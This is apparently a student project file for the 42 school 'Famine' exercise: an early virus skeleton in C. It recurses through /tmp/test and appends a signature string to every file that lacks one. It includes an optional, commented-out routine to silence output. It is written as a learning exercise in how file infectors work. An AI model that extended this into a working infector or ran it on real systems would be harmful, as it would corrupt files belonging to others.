/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
/*   Updated: 2026/03/04 11:05:36 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "test.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>

int	mute_outputs()
{
	int	fd = open("/dev/null", O_RDONLY);
	if (fd == -1)
		return (-1);
	
	dup2(fd, STDOUT_FILENO);
	dup2(fd, STDERR_FILENO);

	close(fd);
	return (0);
}

#define SIGNATURE_STR "Famine version 1.0 (c)oded by mbatty-mbatty\n"

int	check_signature(const char *path)
{
	int	fd = open(path, O_RDONLY);
	if (fd == -1)
		return (-1);

	struct stat	stats;
	fstat(fd, &stats);

	if (stats.st_size == 0)
	{
		close(fd);
		return (0);
	}

	char	*file = mmap(NULL, stats.st_size, PROT_READ, MAP_SHARED, fd, 0);
	if (file == MAP_FAILED)
	{
		close(fd);
		return (-1);
	}

	char	*find = strstr(file, SIGNATURE_STR);
	if (find)
	{
		close(fd);
		munmap(file, stats.st_size);
		return (-1);
	}

	munmap(file, stats.st_size);
	close(fd);
	return (0);
}

int	infect_file(const char *path)
{
	int	fd = open(path, O_RDONLY | O_WRONLY | O_APPEND);
	if (fd == -1)
		return (-1);

	// Need to check if file has valid ELF-64/32 header

	if (check_signature(path) == -1)
		return (-1);

	printf("Infecting %s\n", path);

	write(fd, SIGNATURE_STR, sizeof(SIGNATURE_STR));

	close(fd);
	return (0);
}

char	*strjoin(char const *s1, char const *s2);

#define DIRENT_DIRECTORY 4
int	infect_dir(const char *path)
{
	struct dirent	*dirent = NULL;
	DIR				*dir = opendir(path);
	if (!dir)
		return (-1);

	do
	{
		dirent = readdir(dir);
		if (dirent)
		{
			if (!strcmp(dirent->d_name, ".") || !strcmp(dirent->d_name, ".."))
				continue ;

			char	*path_next = strjoin(path, "/");
			char	*new_path = strjoin(path_next, dirent->d_name);
			free(path_next);

			if (dirent->d_type == DIRENT_DIRECTORY)
				infect_dir(new_path);
			else
				infect_file(new_path);

			free(new_path);
		}
	} while (dirent);
	closedir(dir);
	return (0);
}

int	main(void)
{
	// mute_outputs();
	infect_dir("/tmp/test");
	return (0);
}
